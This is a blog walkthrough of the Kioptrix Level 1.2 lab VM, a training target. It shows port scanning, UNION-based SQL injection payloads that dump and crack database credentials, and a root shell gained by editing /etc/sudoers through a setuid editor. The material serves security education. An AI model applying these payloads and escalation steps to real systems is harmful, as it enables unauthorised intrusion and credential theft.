---
layout: post
title:  "Kioptrix: Level 1.2 (#3)"
date:   2017-04-01
summary: Kioptrix Level 1.2 (#3) walkthrough
---

### Setup
Download and unzip the vm, then mount the .vmdk file as storage in your vm config and setup your network settings. Note that this vm should auto detect using DHCP.

We also need to add the web apps hostname to hosts, this should be done after finding the host on the network.

`echo "192.168.56.102 kioptrix3.com" >> /etc/hosts`


# Kioptrix: Level 1.2 (#3)
To start we need to find the host on the network, to do this I used nmap to do a ping scan on the subnet:

{% highlight python %}
nmap -sn 192.168.56.0/24

Nmap scan report for kioptrix3.com (192.168.56.102)
Host is up (-0.090s latency).
{% endhighlight %}

## Information gathering
Now we know the IP of the host we can use port scanning to see what services are running. With nmap we can also do some banner grabbing, version checking, OS detection and enumeration of services:

{% highlight python %}
nmap -sS -sV -O 192.168.56.102

Nmap scan report for kioptrix3.com (192.168.56.102)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
MAC Address: 08:00:27:B2:2A:A5 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
{% endhighlight %}

The result only shows 2 interesting services, ports 22 (ssh) and 80 (http).

## Web app
The web application is the next place to start gathering information from (its tech stack and functionality) then move on from there. From the nmap scan we know Apache 2.2.8 is running on Ubuntu with PHP 5.2.4-2. To assess the web app we will browse it and note its main functionality then give it a scan with Nikto.

* Gallery CMS
	queries database for photos and sort function
	http://kioptrix3.com/gallery/gallery.php?id=1
* Blog with comments
* Login (powered by lotuscms)
* Nikto scan
	+ Cookie PHPSESSID created without the httponly flag
	+ The X-XSS-Protection header is not defined. 
	+ The X-Content-Type-Options header is not set.
	+ OSVDB-3092: /phpmyadmin/changelog.php:
	+ /phpmyadmin/: phpMyAdmin directory found
	+ OSVDB-3092: /phpmyadmin/Documentation.html
* PHPMyAdmin (2.11.3deb1ubuntu1.3)
	Can login with username admin and a blank password (not full privileges)
	MySQL client version: 5.0.51a

From the information gathered we can see the main attack surface is the web app and its supporting components (Lotuscms and phpMyAdmin). We also have version numbers of several components. The first step is to identify any known vulnerabilities in the versions used then move onto the web app functionality.

phpMyAdmin 2.11.3  
There are a number of vulnerabilities in phpMyAdmin including a potential SQL injection but it requires create table functionality, the admin account doesn't seem to have privileges.

### SQL injection
The gallery app allows us to view images and details of those images, it also has a sort function that queries the db. Here we want to test for sql injection. To do this we supply unexpected syntax eg quotes to see what happens. Using ' we get a verbose error message, perfect.

	http://kioptrix3.com/gallery/gallery.php?id=1'

Returns the error:

>"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' order by parentid,sort,name' at line 1Could not select category"
This error message basically means we can modify the sql query and the app is vulnerable to injection.

Now we want to extract usernames and passwords from the db, to do this we need to use the union operator to combine the results from two queries into one set of results. The drawback of this is that the second query needs to contain the same number of columns as the first and the datatypes must also match. 

To find the number of columns that are in the query we simply add columns until we no longer get an error message.

	1 union select 1,2,3,4,5,6--

From here we can now extract useful data from the db in the string columns eg db name, version etc.

	1 union select 1,version(),3,4,5,6--

	version()	- 5.0.51a-3ubuntu5.4
	database()	- gallery 
	user()		- root@localhost

Now we have a query that works we want to extract usernames and passwords, to do this we need to find the table and column names. This can be done by looking up the metadata about the tables in the information schema.

	1 union select 1,table_name,column_name,4,5,6 from information_schema.columns--

Couple of tables are of interest the gallarific_users, dev_accounts and the user.

{% highlight sql %}
1 union select 1,username,password,4,5,6 from gallarific_users--

admin
n0t7t1k4

1 union select 1,username,password,4,5,6 from dev_accounts--

dreg
0d3eccfb887aabd50f243b3f155c0f85
loneferret
5badcaf789d3d1d09794d8f021f40f0e

1 union select 1,user,password,4,5,6 from mysql.user--

root
*47FB3B1E573D80F44CD198DC65DE7764795F948E
debian-sys-maint
*F46D660C8ED1B312A40E366A86D958C6F1EF2AB8
{% endhighlight %}

Now we have couple of hashes to crack, this can be done online or using a world list. 

### Password cracking
Using hash-identifier we can identify possible hash types, both the hashes from the dev_accounts table are MD5 and the hashes from the mysql.user table are MySQL4.1/MySQL5 / MySQL 160bit - SHA-1.

We can use an online rainbow table https://crackstation.net/ to identify the passwords from the hash.

	admin		n0t7t1k4
	dreg		Mast3r
	loneferret	starwars
	root		fuckeyou

We got root but for whatever reason can't ssh into the box with it, however it does work for phpmyadmin.

### Privilege escalation
We can ssh into the box using dreg and loneferret, dreg has no interesting files but loneferret has a couple (checksec.sh and CompanyPolicy.README). The checksec.sh bash script checks security properties of binaries, the company policy readme contains a message about using the command 'ht' for file editing.

>Hello new employee,  
It is company policy here to use our newly installed software for editing, creating and viewing files.
Please use the command 'sudo ht'.
Failure to do so will result in you immediate termination.  
DG  
CEO

However running the command produces an error:

	loneferret@Kioptrix3:~$ sudo ht
	Error opening terminal: xterm-256color.

After a quick search online we need to change an environment variable.

	export TERM=xterm

To start with lets check the security properties of ht.

	whereis ht
	ht: /usr/local/bin/ht

	./checksec.sh --file=/usr/local/bin/ht

	loneferret@Kioptrix3:~$ ls -l /usr/local/bin/ht
	-rwsr-sr-x 1 root root 2072344 2011-04-16 07:26 /usr/local/bin/ht

The bash script didn't find anything interesting, however after listing the directory we can see ht has setuid set. This means when we run the ht editor it will run with root privileges, and because ht is a file editor we can now edit files with root access. Now we want to give the loneferret user root privileges.

To do this we can edit the sudo users file `/etc/sudoers` and add `/bin/sh` to loneferret, then we can `sudo /bin/sh` to get a shell as root.

	sudo /bin/sh
	# id
	uid=0(root) gid=0(root) groups=0(root)

## Conclusion
The web app contains SQL injection which allows us to extract user names and passwords, these are then cracked and used to ssh into the box. The loneferret home folder contained a note requesting the use of ht to edit files. When run the binary runs as root so we are able to edit any files as if we were the root user.
